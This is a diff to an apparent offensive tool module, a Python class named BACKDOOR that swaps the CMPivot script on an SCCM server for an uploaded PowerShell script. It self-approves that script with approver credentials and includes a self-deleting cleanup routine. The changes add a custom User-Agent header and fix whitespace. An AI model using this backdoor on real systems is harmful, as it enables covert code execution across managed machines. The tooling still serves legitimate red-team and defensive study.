@@ -13,7 +13,7 @@ from lib.logger import logger
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class BACKDOOR:
-    def __init__(self, username, password, target, logs_dir, auser, apassword):
+    def __init__(self, username, password, target, logs_dir, auser, apassword, user_agent):
         self.username = username
         self.password = password
         self.target = target
@@ -22,6 +22,9 @@ class BACKDOOR:
         self.approve_password = apassword
         self.backdoor_script = ""
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
+        self.user_agent = user_agent
+        if (self.user_agent):
+            self.headers['User-Agent'] = self.user_agent
 
     def transform_string(self, input_string):
         if len(input_string) >= 2:
@@ -68,7 +71,7 @@ class BACKDOOR:
             script_body = ""
             cleanup = '''
 function Do-Delete {
-    Remove-Item $MyInvocation.PSCommandPath -Force 
+    Remove-Item $MyInvocation.PSCommandPath -Force
 }
 Do-Delete
 '''
@@ -97,12 +100,12 @@ Do-Delete
                 if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
                     with open(f"{self.logs_dir}/cmpivot_backup.ps1", "r") as f:
                         file_content = f.read()
-                        byte_array = file_content.encode('utf-8') 
+                        byte_array = file_content.encode('utf-8')
                         script_body = base64.b64encode(byte_array).decode('utf-8')
                 else:
                     logger.info("[-] Could not locate backup file.")
                     return
-                
+
             body = {"Script": f"{script_body}",
                     "ScriptVersion": "1",
                     "ScriptName": "CMPivot"}
@@ -112,7 +115,7 @@ Do-Delete
                             auth=HttpNtlmAuth(self.username, self.password),
                             verify=False,
                             headers=self.headers, json=body)
-            
+
             if r.status_code == 201:
                 logger.info("[+] CMPivot script updated successfully.")
                 self.approve_cmpivot()
@@ -121,7 +124,7 @@ Do-Delete
                 logger.info("Status Code: " + r.status_code)
                 logger.info(f"Response:" + r.text)
                 return
-            
+
         except Exception as e:
             logger.info(e)
 
@@ -159,7 +162,7 @@ Do-Delete
                 logger.info("Status Code: " + r.status_code)
                 logger.info("Response:" + r.text)
                 return
-     
+
         except Exception as e:
             logger.info(e)
 
